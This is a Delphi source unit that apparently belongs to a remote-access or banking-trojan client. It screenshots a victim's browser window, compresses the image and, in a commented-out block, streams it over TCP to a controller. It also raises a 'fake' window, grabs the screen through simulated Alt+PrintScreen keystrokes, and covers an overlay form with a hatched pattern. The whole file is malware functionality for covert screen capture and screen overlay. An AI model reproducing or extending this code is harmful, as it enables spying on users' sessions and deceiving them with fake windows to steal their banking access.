unit uScreenFuncs;

interface

uses Windows, Classes, {uClient,} Conectar, SysUtils, uSOBRE, Graphics, JPEG, Zlib, ClipBrd, Dialogs;

procedure SendPrint(Quality: Integer);
procedure Print2;
procedure MarcaDagua;


implementation

procedure DoCompress(inStream: TStream);
var
  outMS   : TMemorystream;
  ZStream : TCompressionStream;
begin
  outMS := TMemorystream.Create;
  try
    inStream.Seek(0, soFromBeginning);
    outMS.Size := 0;
    ZStream := TCompressionStream.Create(clMax, outMS);
    try
      ZStream.CopyFrom(inStream, 0);
    finally
      ZStream.Free;
    end;
    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    outMS.Free;
  end;
end;

function WindowSnap(windowHandle: HWND): Tbitmap;
var r: TRect;
    user32DLLHandle: THandle;
    bmp: Tbitmap;
printWindowAPI: function(sourceHandle: HWND; destinationHandle: HDC; nFlags: UINT): BOOL; stdcall;
begin
  user32DLLHandle := GetModuleHandle(user32);
  if user32DLLHandle <> 0 then
  begin
    @printWindowAPI := GetProcAddress(user32DLLHandle,'PrintWindow') ;
    if @printWindowAPI <> nil then
        begin
          GetWindowRect(windowHandle, r) ;
          bmp := TBitmap.Create;
          bmp.Width := r.Right - r.Left;
          bmp.Height := r.Bottom - r.Top;
          bmp.Canvas.Lock;
          try
            printWindowAPI(windowHandle, bmp.Canvas.Handle, 0) ;
          finally
            bmp.Canvas.Unlock;
          end;
          Result := bmp;
        end;
  end;
end;

function PrintScreen(Window: HWND; Quality: Integer): TMemorystream;
var
  DC: HDC;
  Bitmap: Tbitmap;
  JPG: TJPEGImage;
begin
  Bitmap := Tbitmap.Create;
  if not fCliente.XP then
     begin
       DC := GetDC(Window);
       try
         Bitmap.Width  := GetDevicecaps(DC, HORZRES);
         Bitmap.Height := GetDevicecaps(DC, VERTRES);
         BitBlt(Bitmap.Canvas.Handle, 0, 0, Bitmap.Width, Bitmap.Height, DC, 0,  0, SRCCOPY);
       finally
         ReleaseDC(GetDesktopWindow, DC);
       end;
     end
  else
     Bitmap := WindowSnap(Window);
  JPG := TJPEGImage.Create;
  JPG.Assign(Bitmap);
  JPG.CompressionQuality := Quality;
  JPG.Compress;
  JPG.JPEGNeeded;
  Result := TMemorystream.Create;
  JPG.SaveToStream(Result);
  JPG.Destroy;
  Bitmap.Free;
end;

procedure Print2;
begin
  try
    //Sleep(100);
    keybd_event(VK_MENU, 0, 0, 0);
    //Sleep(100);
    keybd_event(VK_SNAPSHOT, 0, 0, 0);
    //Sleep(100);
    keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
    //Sleep(100);
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
    BringWindowToTop(fCliente.FakeHWND);
    SetForegroundWindow(fCliente.FakeHWND);
    if Clipboard.HasFormat(CF_PICTURE) then
       fSOBRE.Image.Picture.Assign(Clipboard)
    else
       Print2;
  finally
  //  Clipboard.Clear;
  end;
end;


procedure SendPrint(Quality: Integer);
var
  Print: TMemorystream;
begin
  try
    Print := TMemorystream.Create;
    try
      if IsIconic(fCliente.FakeHWND) then
         ShowWindow(fCliente.FakeHWND,SW_MAXIMIZE);
      Print := PrintScreen(fCliente.BrowserHWND, Quality);
      DoCompress(Print);
      {
      fCliente.TCP.IOHandler.LargeStream := true;
      fCliente.TCP.IOHandler.WriteLn('PRINT');
      fCliente.TCP.IOHandler.WriteLn(IntToStr(Print.Size));
      fCliente.TCP.IOHandler.Write(Print);
      }
    except
      // Print.Free;
      SendPrint(12);
    end;
  finally
    Print.Free;
  end;
end;

procedure MarcaDagua;
var
  X, Y: Integer;
begin
  fSOBRE.Brush.Style := bsClear;
  for Y := 15 to fSOBRE.Image.Height - 1 do
  begin
    for X := 0 to fSOBRE.Image.Width - 1 do
    begin
      if (X mod 4) = (Y mod 4) then
        fSOBRE.Image.Canvas.pixels[X, Y] := clBlack;//  $00030303;//clBlack;
    end;
  end;
end;

end.
